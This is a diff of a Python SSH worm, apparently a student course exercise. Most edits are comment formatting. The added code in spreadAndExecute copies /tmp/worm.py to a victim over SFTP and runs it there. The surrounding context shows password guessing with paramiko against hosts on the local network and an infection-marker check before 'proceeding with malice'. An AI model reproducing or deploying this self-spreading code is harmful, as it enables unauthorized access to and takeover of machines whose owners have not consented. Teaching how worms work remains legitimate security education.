@@ -40,14 +40,14 @@ def isInfectedSystem():
 	# you created when you marked the system
 	# as infected). 
 
-	#Yu
+	# Yu
 	# Go to /tmp folder?
 	# read infected.txt
 	# if infected.txt exists
 	#	returns 1 to signify infected
 	# else
 	#	returns 0 to signify not infected
-	#/Yu
+	# /Yu
 	# kevin
 	if os.path.exists(INFECTED_MARKER_FILE):
 		return 1
@@ -94,11 +94,19 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this 
 
+	# yu ?
 	# infectedTracker = isInfectedSystem()
 	# function
-				#	# is very similar to that code.	
+	# is very similar to that code.	
+	# /yu ???
+
+
+	# kevin
+	sftpClient = sshClient.open_sftp()
+	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
+	sshClient.exec_command("python3 /tmp/worm.py")
+	# sshClient.exec_command("for i in {1..5}: do logger")
 	pass
-					#
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -133,20 +141,20 @@ def tryCredentials(host, userName, password, sshClient):
 	# declaration (if you choose to use
 	# this skeleton).
 
-	#Desirae Prather
+	# Desirae Prather
 	try:
 		sshClient.connect(host, username=userName, password=password)
 	except socket.error:
-		#probably the server is down or is not running SSH
+		# probably the server is down or is not running SSH
 		print("Error: Host is unreachable")
 		return 3
 	except paramiko.SSHException:
-		#probably wrong credentials
+		# probably wrong credentials
 		print("Error: Incorrect credentials. Failed to establsh SSH connection.")
 		return 1
 		
 	return 0
-	#/Desirae Prather
+	# /Desirae Prather
 
 
 ###############################################################
@@ -186,11 +194,11 @@ def attackSystem(host):
 		# to the remote system. 
 
 
-		#Desirae Prather
+		# Desirae Prather
 		if tryCredentials(host=host,userName=username,password=password,sshClient=ssh) == 0:
 			print("Found and return instance of the SSH connection")
-			attemptResults = (host, username, password, ssh)
-		#	/Desirae Prather
+			attemptResults = (ssh, host, username, password)
+		# /Desirae Prather
 			
 	# Could not find working credentials
 	return attemptResults
@@ -261,20 +269,22 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice.
-	#Desirae Prather 
+	# Desirae Prather 
 	if isInfectedSystem()==1:
+		#terminate
 		exit(1)
 	else:
+		# infect victim
 		markInfected()
-	#/DesiraePrather
+	# /DesiraePrather
 		
 	pass
 
 # TODO: Get the IP of the current system
-#Desirae Prather
+# Desirae Prather
 interface = interfaces()
 currentIP = getMyIP(interface)
-#/Desirae Prather
+# /Desirae Prather
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
